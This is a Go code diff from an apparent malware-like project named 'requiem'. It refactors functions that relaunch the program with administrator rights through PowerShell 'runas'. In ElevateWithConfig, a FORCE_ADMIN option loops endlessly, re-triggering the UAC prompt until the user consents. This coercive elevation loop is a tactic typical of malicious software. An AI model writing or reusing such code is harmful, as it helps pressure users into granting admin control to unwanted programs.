@@ -3,19 +3,30 @@ package funcs
 import (
 	"fmt"
 	"os"
-	"os/exec"
 
 	"requiem/store"
+	"requiem/utils"
 )
 
-func Elevate() {
+func AttempElevate() bool {
+	err := utils.RunCommand("powershell", "-c",
+		fmt.Sprintf(`start "%s" -verb runas`, store.ExecPath),
+	)
+
+	if err != nil {
+		return false
+	}
+
+	return true
+}
+
+func ElevateWithConfig() {
 	if store.FORCE_ADMIN {
 		for {
-			cmd := exec.Command("powershell", "-c",
+			err := utils.RunCommand("powershell", "-c",
 				fmt.Sprintf(`start "%s" -verb runas`, store.ExecPath),
 			)
 
-			err := cmd.Run()
 			if err != nil {
 				continue
 			}
@@ -25,11 +36,10 @@ func Elevate() {
 	}
 
 	if store.PROMPT_ADMIN {
-		cmd := exec.Command("powershell", "-c",
+		err := utils.RunCommand("powershell", "-c",
 			fmt.Sprintf(`start "%s" -verb runas`, store.ExecPath),
 		)
 
-		err := cmd.Run()
 		if err != nil && !store.CONTINUE_WITHOUT_ADMIN {
 			os.Exit(0)
 		}
